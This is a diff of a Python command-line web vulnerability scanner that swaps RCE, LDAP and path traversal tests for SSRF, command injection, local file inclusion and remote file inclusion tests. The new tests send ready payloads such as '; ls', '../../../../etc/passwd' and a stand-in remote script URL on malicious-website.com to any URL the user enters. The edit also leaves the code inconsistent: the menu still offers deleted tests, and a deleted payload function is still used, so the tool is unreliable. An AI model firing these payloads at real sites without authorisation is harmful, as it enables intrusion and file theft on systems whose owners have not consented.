@@ -85,83 +85,54 @@ def log_result_html(test_name, result, details=""):
     with open("penetration_testing_report.html", "a") as html_file:
         html_file.write(report_entry)
 
-    with open("penetration_testing_report.html", "a") as html_file:
-        html_file.write("""
-                    </table>
-                </body>
-            </html>
-            """)
-
-# Function to simulate crawling (stub function, needs implementation)
-def crawl_website(url):
-    print(f"Crawling website: {url}")
-    # Add your crawling logic here
-    log_result("Crawl Website", "Success", f"Crawled {url} and extracted forms.")
-
-# Function to simulate brute force testing (stub function, needs implementation)
-def brute_force_test(url):
-    print(f"Running brute force test on: {url}")
-    # Add brute force logic here
-    log_result("Brute Force Test", "Success", f"Brute forced {url}.")
-
 # --- New Vulnerability Tests ---
-# RCE Test (Remote Code Execution)
-def rce_test(url):
-    print(f"Testing for Remote Code Execution (RCE) on: {url}")
-    # Add RCE testing logic here
-    payload = {"cmd": "whoami"}
+# SSRF Test (Server-Side Request Forgery)
+def ssrf_test(url):
+    print(f"Testing for SSRF on: {url}")
+    payload = {"url": "http://127.0.0.1:80"}  # Targeting localhost
     response = requests.post(url, data=payload)
-    if "root" in response.text or "admin" in response.text:
-        log_result("RCE Test", "Vulnerable", f"RCE vulnerability detected on {url}. Command output: {response.text}")
+    if "refused" not in response.text:
+        log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected on {url}. Response: {response.text}")
     else:
-        log_result("RCE Test", "Not Vulnerable", f"No RCE vulnerability detected on {url}.")
+        log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected on {url}.")
 
-# LDAP Injection Test
-def ldap_injection_test(url):
-    print(f"Testing for LDAP Injection on: {url}")
-    payload = {"username": "admin", "password": "' OR 1=1"}
+# Command Injection Test
+def command_injection_test(url):
+    print(f"Testing for Command Injection on: {url}")
+    payload = {"input": "; ls"}  # Basic command injection payload
     response = requests.post(url, data=payload)
-    if "Authentication failed" not in response.text:
-        log_result("LDAP Injection Test", "Vulnerable", f"LDAP Injection vulnerability detected on {url}. Response: {response.text}")
+    if "bin" in response.text or "root" in response.text:
+        log_result("Command Injection Test", "Vulnerable", f"Command Injection vulnerability detected on {url}. Response: {response.text}")
     else:
-        log_result("LDAP Injection Test", "Not Vulnerable", f"No LDAP Injection vulnerability detected on {url}.")
+        log_result("Command Injection Test", "Not Vulnerable", f"No Command Injection vulnerability detected on {url}.")
 
-# Path Traversal Test
-def path_traversal_test(url):
-    print(f"Testing for Path Traversal on: {url}")
-    payload = {"file": "../../etc/passwd"}
-    response = requests.get(url, params=payload)
-    if "root:" in response.text:
-        log_result("Path Traversal Test", "Vulnerable", f"Path Traversal vulnerability detected on {url}. Response: {response.text}")
+# LFI/RFI Test
+def lfi_rfi_test(url):
+    print(f"Testing for LFI/RFI on: {url}")
+    lfi_payload = {"file": "../../../../etc/passwd"}  # Common LFI payload
+    rfi_payload = {"file": "http://malicious-website.com/malicious.php"}  # Common RFI payload
+
+    # LFI Test
+    lfi_response = requests.get(url, params=lfi_payload)
+    if "root:" in lfi_response.text:
+        log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected on {url}. Response: {lfi_response.text}")
     else:
-        log_result("Path Traversal Test", "Not Vulnerable", f"No Path Traversal vulnerability detected on {url}.")
+        log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected on {url}.")
 
-# --- Payload Crafting (for specific vulnerabilities) ---
-def craft_sql_injection_payload():
-    # Craft common SQL injection payloads
-    payloads = [
-        "' OR 1=1 --",
-        "' UNION SELECT NULL, username, password FROM users --",
-        # "'; DROP TABLE users --"  # Commented out to avoid accidental data loss
-    ]
-    return random.choice(payloads)
-
-# --- Exploit Execution (Optional) ---
-def execute_exploit(url, exploit_type):
-    if exploit_type == "RCE":
-        print(f"Executing Remote Code Execution exploit on {url}")
-        # Add RCE exploit logic here (ensure ethical use)
-        payload = {"cmd": "whoami"}
-        response = requests.post(url, data=payload)
-        log_result("RCE Exploit", "Executed", f"Command output: {response.text}")
-    # Add more exploits like LDAP injection, XSS, etc., with a similar structure
+    # RFI Test
+    rfi_response = requests.get(url, params=rfi_payload)
+    if "malicious" in rfi_response.text:
+        log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected on {url}. Response: {rfi_response.text}")
+    else:
+        log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected on {url}.")
 
 # --- Menu System ---
 def print_main_menu():
     options = [
         "[1] Crawl Website and Extract Forms", "[2] Brute Force Test (Optional)", 
         "[3] RCE Test", "[4] LDAP Injection Test", "[5] Path Traversal Test", 
-        "[6] SQL Injection Test", "[7] Execute Exploit", "[8] Exit"
+        "[6] SQL Injection Test", "[7] SSRF Test", "[8] Command Injection Test", 
+        "[9] LFI/RFI Test", "[10] Exit"
     ]
     
     # Display options in a column-like structure
@@ -175,9 +146,9 @@ def print_main_menu():
 # Function to get user input for form selection
 def get_user_input():
     try:
-        return int(input("Enter your choice (1-8): "))
+        return int(input("Enter your choice (1-10): "))
     except ValueError:
-        print("Invalid input, please enter a number between 1 and 8.")
+        print("Invalid input, please enter a number between 1 and 10.")
         return get_user_input()
 
 # Main function to manage the user interface
@@ -206,10 +177,15 @@ def main():
                 print(f"Crafted SQL Injection Payload: {payload}")
                 # Implement SQL Injection test with crafted payload here
             elif choice == 7:
-                url = input("Enter the URL for Exploit Execution: ")
-                exploit_type = input("Enter exploit type (RCE, LDAP, XSS, etc.): ")
-                execute_exploit(url, exploit_type)
+                url = input("Enter the URL for SSRF Test: ")
+                ssrf_test(url)
             elif choice == 8:
+                url = input("Enter the URL for Command Injection Test: ")
+                command_injection_test(url)
+            elif choice == 9:
+                url = input("Enter the URL for LFI/RFI Test: ")
+                lfi_rfi_test(url)
+            elif choice == 10:
                 print("Exiting...")
                 break
             else:
